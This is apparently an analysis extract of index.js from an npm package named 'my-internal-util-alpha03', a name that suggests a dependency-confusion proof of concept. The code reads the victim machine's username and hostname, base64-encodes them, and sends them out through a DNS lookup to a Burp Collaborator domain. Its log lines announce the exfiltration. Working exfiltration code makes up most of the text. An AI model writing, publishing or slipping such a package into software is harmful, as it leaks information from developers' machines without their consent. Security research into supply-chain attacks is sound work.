// File: var/folders/83/v1gvs5x976xdn94tnyk95j8r0000gq/T/tmp5bq8m8cr/my-internal-util-alpha03/package/index.js
// ======================================================================
Line 2: const dns = require('dns')
Line 3: const os = require('os')
Line 11: {
    // 1. Gather information from the victim machine
    const userInfo = os.userInfo();
    const username = userInfo.username;
    const hostname = os.hostname();
    const data = `user=${username}-host=${hostname}`;

    // 2. Encode the data to be DNS-safe (Base64 is good, but remove padding and special chars)
    const encodedData = Buffer.from(data).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

    // 3. Construct the malicious domain to query
    // The encoded data will be a subdomain of your collaborator URL
    const exfilDomain = `${encodedData}.${collaboratorUrl}`;

    console.log(`[+] Exfiltrating data via DNS lookup to: ${exfilDomain}`);

    // 4. Trigger the DNS lookup. We don't care about the result, just that the request is made.
    dns.lookup(exfilDomain, (err, address, family) => {
        // This callback will likely have an error (e.g., ENOTFOUND), which is expected.
        // The goal is not to resolve the address, but to ...
Line 13: os.userInfo()
Line 15: os.hostname()
Line 19: Buffer.from(data).toString('base64')
Line 25: console.log(`[+] Exfiltrating data via DNS lookup to: ${exfilDomain}`)
Line 32: {
            console.log('[+] DNS lookup sent (error is expected). Check Burp Collaborator.');
        }
Line 33: console.log('[+] DNS lookup sent (error is expected). Check Burp Collaborator.')
